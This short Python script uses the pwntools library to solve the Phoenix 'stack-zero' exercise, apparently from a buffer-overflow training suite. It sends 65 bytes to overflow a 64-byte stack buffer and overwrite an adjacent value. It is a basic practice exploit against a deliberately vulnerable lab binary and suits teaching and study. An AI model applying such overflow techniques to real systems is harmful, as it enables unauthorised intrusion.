from pwn import *

p = process('/opt/phoenix/i486/stack-zero')

buf = "A" * 64 + "A" # An additional buffer is needed to overwrite the value

p.sendline(buf)

p.interactive()
